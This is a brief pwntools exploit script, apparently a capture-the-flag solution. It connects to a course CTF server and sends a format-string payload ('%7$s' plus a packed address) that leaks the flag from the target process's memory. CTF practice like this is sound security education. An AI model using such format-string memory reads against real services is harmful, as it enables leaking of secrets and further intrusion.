from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10133
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

flag = 0x600ba0

r.recvuntil('? ')
r.sendline(b'%7$saaaa' + p64(flag))

r.interactive()
